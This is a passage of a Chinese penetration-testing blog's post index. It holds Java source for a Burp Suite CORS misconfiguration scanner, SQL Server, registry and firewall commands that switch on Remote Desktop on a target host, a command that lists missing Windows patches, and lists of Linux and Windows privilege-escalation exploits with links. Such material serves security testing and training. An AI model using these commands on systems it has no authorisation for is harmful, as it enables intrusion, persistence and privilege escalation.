效果：","tags":[{"name":"安全开发","slug":"安全开发","permalink":"https://www.mi1k7ea.com/tags/安全开发/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"BurpSuite","slug":"BurpSuite","permalink":"https://www.mi1k7ea.com/tags/BurpSuite/"}]},{"title":"BurpExtender开发之CORS跨域漏洞扫描器","date":"2021-01-30T06:17:43.000Z","path":"2021/01/30/BurpExtender开发之CORS跨域漏洞扫描器/","text":"直接看代码吧，BurpExtender.java： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274package burp;import javax.swing.*;import javax.swing.table.AbstractTableModel;import javax.swing.table.TableModel;import java.awt.*;import java.io.PrintWriter;import java.net.URL;import java.util.*;import java.util.List;import java.util.concurrent.atomic.AtomicBoolean;public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController, IHttpListener&#123; private IBurpExtenderCallbacks callbacks; private IExtensionHelpers helpers; private JSplitPane splitPane; private IMessageEditor requestViewer; private IMessageEditor scanViewer; private IMessageEditor responseViewer; private List&lt;VulEntry&gt; vul_list = new ArrayList&lt;VulEntry&gt;(); private IHttpRequestResponse currentlyDisplayedItem; public PrintWriter stdout; final String WebSocket_Word = \"Upgrade: websocket\"; final String Evil_Domain = \"http://evil.com\"; @Override public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks)&#123; this.callbacks = callbacks; this.stdout = new PrintWriter(callbacks.getStdout(), true); this.helpers = callbacks.getHelpers(); this.stdout.println(\"Author: Mi1k7ea\"); callbacks.setExtensionName(\"CORS CrossDomain Vul Scan\"); callbacks.registerScannerCheck(this); // create our UI SwingUtilities.invokeLater(new Runnable() &#123; @Override public void run() &#123; // main split pane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT); // table of vul entries Table vulTable = new Table(BurpExtender.this); JScrollPane scrollPane = new JScrollPane(vulTable); splitPane.setLeftComponent(scrollPane); // tabs with request/response viewers JTabbedPane tabs = new JTabbedPane(); requestViewer = callbacks.createMessageEditor(BurpExtender.this, false); scanViewer = callbacks.createMessageEditor(BurpExtender.this, false); responseViewer = callbacks.createMessageEditor(BurpExtender.this, false); tabs.addTab(\"Origin Request\", requestViewer.getComponent()); tabs.addTab(\"Fuzzing Request\", scanViewer.getComponent()); tabs.addTab(\"Response\", responseViewer.getComponent()); splitPane.setRightComponent(tabs); // customize our UI components callbacks.customizeUiComponent(splitPane); callbacks.customizeUiComponent(vulTable); callbacks.customizeUiComponent(scrollPane); callbacks.customizeUiComponent(tabs); // add the custom tab to Burp's UI callbacks.addSuiteTab(BurpExtender.this); // register ourselves as an HTTP listener callbacks.registerHttpListener(BurpExtender.this); &#125; &#125;); &#125; @Override public List&lt;IScanIssue&gt; doPassiveScan( IHttpRequestResponse baseRequestResponse) &#123; this.stdout.println(\"[*]Passive Scan: \" + baseRequestResponse.getHttpService()); // 获取请求方法 String method = this.helpers.analyzeRequest(baseRequestResponse).getMethod(); // 提取请求参数 List&lt;IParameter&gt; baseParams = this.helpers.analyzeRequest(baseRequestResponse.getRequest()).getParameters(); StringBuilder sb = new StringBuilder(); baseParams.forEach(p -&gt; &#123; if (sb.length() &gt; 0) &#123; sb.append(\"&amp;\" + p.getName() + \"=\" + p.getValue()); &#125; else &#123; sb.append(p.getName() + \"=\" + p.getValue()); &#125; &#125;); String baseRequestParams = sb.toString(); scanCORS(baseRequestResponse, method, baseRequestParams); return null; &#125; @Override public List&lt;IScanIssue&gt; doActiveScan( IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) &#123; // TODO here return null; &#125; @Override public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) &#123; // TODO here return 0; &#125; @Override public String getTabCaption() &#123; return \"CORS跨域漏洞扫描器\"; &#125; @Override public Component getUiComponent() &#123; return this.splitPane; &#125; @Override public IHttpService getHttpService() &#123; return this.currentlyDisplayedItem.getHttpService(); &#125; @Override public byte[] getRequest() &#123; return this.currentlyDisplayedItem.getRequest(); &#125; @Override public byte[] getResponse() &#123; return this.currentlyDisplayedItem.getResponse(); &#125; @Override public int getRowCount() &#123; return vul_list.size(); &#125; @Override public int getColumnCount() &#123; return 2; &#125; @Override public String getColumnName(int columnIndex) &#123; switch (columnIndex) &#123; case 0: return \"Name\"; case 1: return \"URL\"; default: return \"\"; &#125; &#125; @Override public Class&lt;?&gt; getColumnClass(int columnIndex) &#123; return String.class; &#125; @Override public Object getValueAt(int rowIndex, int columnIndex) &#123; VulEntry vulEntry = vul_list.get(rowIndex); switch (columnIndex) &#123; case 0: return vulEntry.vul_name; case 1: return vulEntry.url.toString(); default: return \"\"; &#125; &#125; @Override public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) &#123; &#125; // extend JTable to handle cell selection private class Table extends JTable &#123; public Table(TableModel tableModel) &#123; super(tableModel); &#125; @Override public void changeSelection(int row, int col, boolean toggle, boolean extend) &#123; VulEntry vulEntry = vul_list.get(row); requestViewer.setMessage(vulEntry.baseRequestResponse.getRequest(), true); scanViewer.setMessage(vulEntry.fuzzingRequestResponse.getRequest(), true); responseViewer.setMessage(vulEntry.fuzzingRequestResponse.getResponse(), false); currentlyDisplayedItem = vulEntry.fuzzingRequestResponse; super.changeSelection(row, col, toggle, extend); &#125; &#125; private static class VulEntry &#123; String vul_name; IHttpRequestResponsePersisted baseRequestResponse; IHttpRequestResponsePersisted fuzzingRequestResponse; URL url; public VulEntry(String vul_name, IHttpRequestResponsePersisted baseRequestResponse, IHttpRequestResponsePersisted fuzzingRequestResponse, URL url) &#123; this.vul_name = vul_name; this.baseRequestResponse = baseRequestResponse; this.fuzzingRequestResponse = fuzzingRequestResponse; this.url = url; &#125; &#125; void scanCORS(IHttpRequestResponse baseRequestResponse, String method, String baseRequestParams) &#123; List&lt;String&gt; response_headers = this.helpers.analyzeResponse(baseRequestResponse.getResponse()).getHeaders(); AtomicBoolean acao = new AtomicBoolean(false); AtomicBoolean acac = new AtomicBoolean(false); response_headers.forEach(header -&gt; &#123; if (header.toLowerCase().startsWith(\"access-control-allow-origin: \")) &#123; acao.set(true); &#125; if (header.toLowerCase().equals(\"access-control-allow-credentials: true\")) &#123; acac.set(true); &#125; &#125;); // 这里添加了ACAC为true的条件，也可以去掉，看实际情况 if (acao.get() &amp;&amp; acac.get()) &#123; // 替换Origin头为恶意域名 List&lt;String&gt; fuzzing_headers = this.helpers.analyzeRequest(baseRequestResponse).getHeaders(); fuzzing_headers.forEach(header -&gt; &#123; if (header.toLowerCase().startsWith(\"origin:\")) &#123; Collections.replaceAll(fuzzing_headers, header, \"Origin: \" + this.Evil_Domain); &#125; &#125;); byte[] baseBody = null; if (method.equals(\"POST\")) &#123; baseBody = this.helpers.stringToBytes(baseRequestParams); &#125; byte[] fuzzingBody = this.helpers.buildHttpMessage(fuzzing_headers, baseBody); IHttpRequestResponse fuzzingRequestResponse = this.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), fuzzingBody); if (this.helpers.analyzeResponse(fuzzingRequestResponse.getResponse()).getHeaders().contains(\"Access-Control-Allow-Origin: \" + this.Evil_Domain) || this.helpers.analyzeResponse(fuzzingRequestResponse.getResponse()).getHeaders().contains(\"Access-Control-Allow-Origin: *\")) &#123; this.stdout.println(\"[!]存在CORS跨域漏洞!\"); int row = this.vul_list.size(); this.vul_list.add( new VulEntry( \"CORS跨域漏洞\", this.callbacks.saveBuffersToTempFiles(baseRequestResponse), this.callbacks.saveBuffersToTempFiles(fuzzingRequestResponse), this.helpers.analyzeRequest(fuzzingRequestResponse).getUrl() ) ); fireTableRowsInserted(row, row); &#125; &#125; &#125;&#125; 效果： 小问题：有些接口请求没有带Origin头但是可能存在CORS跨域漏洞，跨域针对这种情况自行判断响应存在ACAC后重新构造的请求报文中添加Origin头来测试。","tags":[{"name":"安全开发","slug":"安全开发","permalink":"https://www.mi1k7ea.com/tags/安全开发/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"BurpSuite","slug":"BurpSuite","permalink":"https://www.mi1k7ea.com/tags/BurpSuite/"}]},{"title":"SQL Server常用操作远程桌面语句","date":"2021-01-26T13:16:47.000Z","path":"2021/01/26/SQL-Server常用操作远程桌面语句/","text":"0x00 前言参考Micro8系列第七课：https://micro8.gitbook.io/micro8/contents-1/1-10/7sqlserver-chang-yong-cao-zuo-yuan-cheng-zhuo-mian-yu-ju 0x01 是否开启远程桌面123EXEC master..xp_regread &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\\CurrentControlSet\\Control\\Terminal Server&apos;,&apos;fDenyTSConnections&apos; 1：表示关闭 0：表示开启 0x02 读取远程桌面端口123EXEC master..xp_regread &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp&apos;,&apos;PortNumber&apos; 本地的注册表位置中TerminalServer中间是需要加个空格的，看具体情况而定： 0x03 开启远程桌面123EXEC master.dbo.xp_regwrite&apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\\CurrentControlSet\\Control\\TerminalServer&apos;,&apos;fDenyTSConnections&apos;,&apos;REG_DWORD&apos;,0; reg文件开启远程桌面，保存以下内容为mi1k7ea.reg： 123Windows Registry Editor Version 5.00HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer]&quot;fDenyTSConnections&quot;=dword:00000000[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp]&quot;PortNumber&quot;=dword:00000d3d 然后执行regedit /s mi1k7ea.reg。 注意：如果是第一次开启远程桌面，部分需要配置防火墙规则允许远程端口。 1netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow 0x04 关闭远程桌面123EXEC master.dbo.xp_regwrite&apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\\CurrentControlSet\\Control\\TerminalServer&apos;,&apos;fDenyTSConnections&apos;,&apos;REG_DWORD&apos;,1;","tags":[{"name":"Windows","slug":"Windows","permalink":"https://www.mi1k7ea.com/tags/Windows/"},{"name":"SQL Server","slug":"SQL-Server","permalink":"https://www.mi1k7ea.com/tags/SQL-Server/"}]},{"title":"Linux提权之快速查找EXP","date":"2021-01-20T13:40:34.000Z","path":"2021/01/20/Linux提权之快速查找EXP/","text":"0x00 前言参考Micro8系列第二课：https://micro8.gitbook.io/micro8/contents-1/1-10/2linux-ti-quan-yi-lai-exp-pian 0x01 EXP列表Linux内核漏洞利用列表如下： CVE–2018–18955 [map_write() in kernel/user_namespace.c allows privilege escalation](Linux kernel 4.15.x through 4.19.x before 4.19.2) CVE–2018–1000001 [glibc](glibc &lt;= 2.26) CVE-2017-1000367 [Sudo] (Sudo 1.8.6p7 - 1.8.20) CVE-2017-1000112 [a memory corruption due to UFO to non-UFO path switch] CVE-2017-16995 [Memory corruption caused by BPF verifier] (Linux kernel before 4.14 - 4.4) CVE-2017-16939 [UAF in Netlink socket subsystem – XFRM] (Linux kernel before 4.13.11) CVE-2017-7494 [Samba Remote execution](Samba 3.5.0-4.6.4/4.5.10/4.4.14) CVE-2017-7308 [a signedness issue in AF_PACKET sockets](Linux kernel through 4.10.6) CVE-2017-6074 [a double-free in DCCP protocol](Linux kernel through 4.9.11) CVE-2017-5123 [‘waitid()’](Kernel 4.14.0-rc4+) CVE-2016-9793 [a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options](Linux kernel before 4.8.14) CVE-2016-5195 [Dirty cow](Linux kernel&gt;2.6.22 (released in 2007)) CVE-2016-2384 [a double-free in USB MIDI driver](Linux kernel before 4.5) CVE-2016-0728 [pp_key](3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1) CVE-2015-7547 [glibc getaddrinfo](before Glibc 2.9) CVE-2015-1328 [overlayfs](3.13, 3.16.0, 3.19.0) CVE-2014-5284 [OSSEC](2.8) CVE-2014-4699 [ptrace](before 3.15.4) CVE-2014-4014 [Local Privilege Escalation](before 3.14.8) CVE-2014-3153 [futex](3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8 ,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1) CVE-2014-0196 [rawmodePTY](2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15) CVE-2014-0038 [timeoutpwn](3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1) CVE-2013-2094 [perf_swevent](3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4, 3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9) CVE-2013-1858 [clown-newuser](3.3-3.8) CVE-2013-1763 [__sock_diag_rcv_msg](before 3.8.3) CVE-2013-0268 [msr](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7.0, 3.7.6) CVE-2012-3524 [libdbus](libdbus 1.5.x and earlier) CVE-2012-0056 [memodipper](2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0) CVE-2010-4347 [american-sign-language]( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-4258 [full-nelson](2.6.31, 2.6.32, 2.6.35, 2.6.37) CVE-2010-4073 [half_nelson](2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-3904 [rds](2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-3437 [pktcdvd](2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-3301 [ptrace_kmod2](2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34) CVE-2010-3081 [video4linux](2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33) CVE-2010-2959 [can_bcm](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36) CVE-2010-1146 [reiserfs](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34) CVE-2010-0415 [do_pages_move](2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31) CVE-2009-3547 [pipe.c_32bit](2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31) CVE-2009-2698 [udp_sendmsg_32bit](2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19) CVE-2009-2692 [sock_sendpage](2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30) CVE-2009-2692 [sock_sendpage2](2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28, 2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30) CVE-2009-1337 [exit_notify](2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29) CVE-2009-1185 [udev](2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29) CVE-2008-4210 [ftrex](2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22) CVE-2008-0600 [vmsplice2](2.6.23, 2.6.24) CVE-2008-0600 [vmsplice1](2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1) CVE-2006-3626 [h00lyshit](2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16) CVE-2006-2451 [raptor_prctl](2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17) CVE-2005-0736 [krad3](2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11) CVE-2005-1263 [binfmt_elf.c](Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4) CVE-2004-1235 [elflbl](2.4.29) CVE-N/A [caps_to_root](2.6.34, 2.6.35, 2.6.36) CVE-2004-0077 [mremap_pte](2.4.20, 2.2.24, 2.4.25, 2.4.26, 2.4.27) 0x02 利用工具 https://github.com/SecWiki/linux-kernel-exploits https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/ https://github.com/xairy/kernel-exploits","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Linux","slug":"Linux","permalink":"https://www.mi1k7ea.com/tags/Linux/"},{"name":"提权","slug":"提权","permalink":"https://www.mi1k7ea.com/tags/提权/"}]},{"title":"Windows提权之快速查找EXP及MS11-080","date":"2021-01-20T13:25:03.000Z","path":"2021/01/20/Windows提权之快速查找EXP及MS11-080/","text":"0x00 前言参考Micro8系列第一课：https://micro8.gitbook.io/micro8/contents-1/1-10/1windows-ti-quan-kuai-su-cha-zhao-exp 0x01 时刻关注微软官方安全https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/securitybulletins2017 比如常用的几个已公布的EXP： KB2592799 KB3000061 KB2592799 … 如下命令用于快速查找未打补丁的EXP，可以最安全的减少目标机的未知错误，以免影响业务： 1systeminfo&gt;mi1k7ea.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type mi1k7ea.txt|@find /i \"%i\"|| @echo %i you can fuck)&amp;del /f /q /a mi1k7ea.txt 注意，上述命令需要在可写目录执行，会临时生成mi1k7ea.txt，补丁编号可自行增删。 0x02 工具与EXP列表GitHub： https://github.com/SecWiki/windows-kernel-exploits https://github.com/WindowsExploits/Exploits 漏洞列表： CVE-2020-0787 [Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability] (Windows 7/8/10, 2008/2012/2016/2019) CVE-2020-0796 [A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3) protocol handles certain requests, aka ‘Windows SMBv3 Client/Server Remote Code Execution Vulnerability’] (Windows 1903/1909) CVE-2019-1458 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016) CVE-2019-0803 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016/2019) CVE-2018-8639 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory] (Windows 7/8/10/2008/2012/2016) CVE-2018-1038 [Windows Kernel Elevation of Privilege Vulnerability] (Windows 7 SP1/Windows Server 2008 R2 SP1) CVE-2018-0743 [Windows Subsystem for Linux Elevation of Privilege Vulnerability] (Windows 10 version 1703/Windows 10 version 1709/Windows Server version 1709) CVE-2018-8453 [An elevation of privilege vulnerability in Windows Win32k component] (&gt;= windows 8.1) CVE-2018-8440 [Windows ALPC Elevation of Privilege Vulnerability] (windows 7/8.1/10/2008/2012/2016) MS17-017 [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows 7/8) CVE-2017-8464 [LNK Remote Code Execution Vulnerability] (windows 10/8.1/7/2016/2010/2008) CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10/8.1/7/2016/2010/2008) CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service] (Windows 8.1/Server 2012 R2) CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1) MS17-010 [KB4013389] [Windows Kernel Mode Drivers] (windows 7/2008/2003/XP) MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016) MS16-111 [KB3186973] [kernel api] (Windows 10 10586 (32/64)/8.1) MS16-098 [KB3178466] [Kernel Driver] (Win 8.1) MS16-075 [KB3164038] [Hot Potato] (2003/2008/7/8/2012) MS16-034 [KB3143145] [Kernel Driver] (2008/7/8/10/2012) MS16-032 [KB3143141] [Secondary Logon Handle] (2008/7/8/10/2012) MS16-016 [KB3136041] [WebDAV] (2008/Vista/7) MS16-014 [K3134228] [remote code execution] (2008/Vista/7) MS15-097 [KB3089656] [remote code execution] (win8.1/2012) MS15-076 [KB3067505] [RPC] (2003/2008/7/8/2012) MS15-077 [KB3077657] [ATM] (XP/Vista/Win7/Win8/2000/2003/2008/2012) MS15-061 [KB3057839] [Kernel Driver] (2003/2008/7/8/2012) MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003/2008/7/8/2012) MS15-015 [KB3031432] [Kernel Driver] (Win7/8/8.1/2012/RT/2012 R2/2008 R2) MS15-010 [KB3036220] [Kernel Driver] (2003/2008/7/8) MS15-001 [KB3023266] [Kernel Driver] (2008/2012/7/8) MS14-070 [KB2989935] [Kernel Driver] (2003) MS14-068 [KB3011780] [Domain Privilege Escalation] (2003/2008/2012/7/8) MS14-058 [KB3000061] [Win32k.sys] (2003/2008/2012/7/8) MS14-066 [KB2992611] [Windows Schannel Allowing remote code execution] (VistaSP2/7 SP1/8/Windows 8.1/2003 SP2/2008 SP2/2008 R2 SP1/2012/2012 R2/Windows RT/Windows RT 8.1) MS14-040 [KB2975684] [AFD Driver] (2003/2008/2012/7/8) MS14-002 [KB2914368] [NDProxy] (2003/XP) MS13-053 [KB2850851] [win32k.sys] (XP/Vista/2003/2008/win 7) MS13-046 [KB2840221] [dxgkrnl.sys] (Vista/2003/2008/2012/7) MS13-005 [KB2778930] [Kernel Mode Driver] (2003/2008/2012/win7/8) MS12-042 [KB2972621] [Service Bus] (2008/2012/win7) MS12-020 [KB2671387] [RDP] (2003/2008/7/XP) MS11-080 [KB2592799] [AFD.sys] (2003/XP) MS11-062 [KB2566454] [NDISTAPI] (2003/XP) MS11-046 [KB2503665] [AFD.sys] (2003/2008/7/XP) MS11-011 [KB2393802] [kernel Driver] (2003/2008/7/XP/Vista) MS10-092 [KB2305420] [Task Scheduler] (2008/7) MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5) MS10-059 [KB982799] [ACL-Churraskito] (2008/7/Vista) MS10-048 [KB2160329] [win32k.sys] (XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7) MS10-015 [KB977165] [KiTrap0D] (2003/2008/7/XP) MS10-012 [KB971468] [SMB Client Trans2 stack overflow] (Windows 7/2008R2) MS09-050 [KB975517] [Remote Code Execution] (2008/Vista) MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0) MS09-012 [KB959454] [Chimichurri] (Vista/win7/2008/Vista) MS08-068 [KB957097] [Remote Code Execution] (2000/XP) MS08-067 [KB958644] [Remote Code Execution] (Windows 2000/XP/Server 2003/Vista/Server 2008) MS08-066 [KB956803] [AFD.sys] (Windows 2000/XP/Server 2003) MS08-025 [KB941693] [Win32.sys] (XP/2003/2008/Vista) MS06-040 [KB921883] [Remote Code Execution] (2003/xp/2000) MS05-039 [KB899588] [PnP Service] (Win 9X/ME/NT/2000/XP/2003) MS03-026 [KB823980] 